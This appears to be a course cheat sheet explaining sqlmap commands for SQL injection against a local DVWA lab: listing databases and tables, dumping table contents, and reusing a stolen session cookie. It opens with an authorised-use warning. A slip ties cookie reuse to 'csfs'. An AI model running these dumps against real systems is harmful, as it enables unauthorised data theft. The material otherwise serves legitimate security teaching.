Ethical & Safety Notice

This material presents commands and examples from your assignment. Only use these tools in labs you own or where you have explicit written permission. Unauthorized testing of third-party systems is illegal. The PDF includes the same content and this same warning.

Tip: Click the copy icons next to any command to copy it to your clipboard.

Core Commands

1) Target URL
python sqlmap.py -u "http://localhost/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit"

-u specifies the target URL for testing.

2) List Databases
python sqlmap.py -u "URL" --dbs

--dbs displays available databases.

3) List Tables in a Database
python sqlmap.py -u "URL" -D databasename --tables

-D selects a database. --tables lists tables.

4) Dump Table Data
python sqlmap.py -u "URL" -D databasename -T tablename --dump

-T selects a table. --dump extracts table contents.

5) Use Cookie (e.g., from XSS)
python sqlmap.py -u "URL" --cookie="cookievalue" --dbs

Use --cookie when access requires a cookie/session value. this is related to csfs

Step-by-step Walkthrough

  1. Prepare a safe lab: Use a local VM or intentionally vulnerable app (e.g., DVWA) inside an isolated network.
  2. Install prerequisites: Have Python and sqlmap repository downloaded on your machine.
  3. Start the target: Start your local lab web app (e.g., DVWA on localhost).
  4. Run discovery: Use --dbs to enumerate databases (only in your lab).
  5. Inspect structure: Use -D and --tables to list tables in a chosen DB.
  6. Extract for analysis: Use -T and --dump to retrieve table fields (for legitimate testing).
  7. Session-based testing: If site requires cookies, capture them in your authorized lab and use --cookie.
